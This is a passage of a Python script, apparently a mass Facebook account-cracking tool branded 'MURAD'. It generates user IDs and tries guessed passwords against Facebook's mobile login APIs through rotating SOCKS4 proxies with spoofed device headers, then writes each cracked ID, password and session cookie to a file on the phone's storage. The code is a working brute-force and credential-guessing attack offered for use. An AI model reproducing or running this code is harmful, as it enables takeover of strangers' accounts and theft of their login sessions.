        print(f'\033[1;97m [\033[1;92m+\033[1;97m]\033[1;92m TOTAL UID \033[1;97m<>\033[1;92m {str(len(user))}')
        print(f"\033[1;97m [\033[1;92m+\033[1;97m]\033[1;92m TURN \033[1;97m[\033[1;92mON\033[1;97m/\033[1;92mOFF\033[1;97m]\033[1;92m AIRPLANE MODE FOR BEST RESULTS");linex()
        for love in user:
            ids = code + love
            psd = [love,ids[:8],'57273200','59039200','57575751']
            if option=='1':
            	murad.submit(randm,ids,psd)
            elif option=='2':
            	murad.submit(randm1,ids,psd)
    print('')
    print(f'\r\033[1;97m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f' \033[1;97m[\033[1;92m+\033[1;97m]\033[1;92m THE PROCESS HAS BEEN COMPLETED')
    print(f' \033[1;97m[\033[1;92m+\033[1;97m]\033[1;92m TOTAL OK ID\033[1;97m <> \033[1;92m{str(len(ok))}')
    print(f' \033[1;97m[\033[1;92m+\033[1;97m] \033[1;92mTOTAL CP ID \033[1;97m<>\033[1;92m {str(len(cp))}')
    print(f'\r \033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    input(f' [+] PRESS ENTER TO BACK ')
    menu()
#__________________RANDON METHOD____________#
def randm(ids,psd):
    global loop,ok,xvx
    sys.stdout.write(f'\r\r \033[1;92mSCANING\033[1;97m-\033[1;92mM1\033[1;97m <> \033[1;92m{loop} \033[1;97m<> \033[1;92mOK: \033[1;97m<> \033[1;92m{len(ok)} ')
    sys.stdout.flush()
    try:
        for pas in psd:
            prox=random.choice(xvx)
            bro= {'http': 'socks4://'+prox}
            data={'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': Samsung(),
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'MOBILE.LITE',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False,proxies=bro).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                res = requests.get(f"https://graph.facebook.com/"+uid+"/picture?type=normal").text
                if res == 'Photoshop':
                	print(f'\r\r[MURAD-OK] {uid} | {pas}');open('/sdcard/MURAD-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');ok.append(uid);break
                #if res == 'LOCK':
                	#print(f'\r\r[MURAD-LK] {uid} | {pas}');break
            else:continue
        loop+=1
    except Exception as e:
        pass
#______________________M2__________________#
def randm1(ids,psd):
    global loop,ok,xvx
    sys.stdout.write(f'\r\r \033[1;92mSCANING\033[1;97m-\033[1;92mM2\033[1;97m <> \033[1;92m{loop} \033[1;97m<> \033[1;92mOK: \033[1;97m<> \033[1;92m{len(ok)} ')
    sys.stdout.flush()
    try:
        for pas in psd:
            prox=random.choice(xvx)
            bro= {'http': 'socks4://'+prox}
            data={'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': ids,
            'password': pas,
            'generate_analytics_claims': '1', 
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false', 
            'generate_session_cookies': '1', 
            'generate_machine_id': '1', 
            'meta_inf_fbmeta': '', 
            'currently_logged_in_userid': '0', 
            'fb_api_req_friendly_name': 'authenticate'}
            head={'User-Agent': Samsung(), 
            'Accept-Encoding': 'gzip, deflate', 
            'Accept': '*/*', 
            'Connection': 'keep-alive', 
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)), 
            'X-FB-Net-HNI': str(random.randint(20000, 40000)), 
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 
            'X-FB-Connection-Type': 'unknown',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger'}
            url = 'https://api.facebook.com/method/auth.login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False,proxies=bro).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                res = requests.get(f"https://graph.facebook.com/"+uid+"/picture?type=normal").text
                if res == 'Photoshop':
                	print(f'\r\r[MURAD-OK] {uid} | {pas}');open('/sdcard/MURAD-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');ok.append(uid);break
                #if res == 'LOCK':
                	#print(f'\r\r[MURAD-LK] {uid} | {pas}');break
            else:continue
        loop+=1
    except Exception as e:
        pass
           
menu()


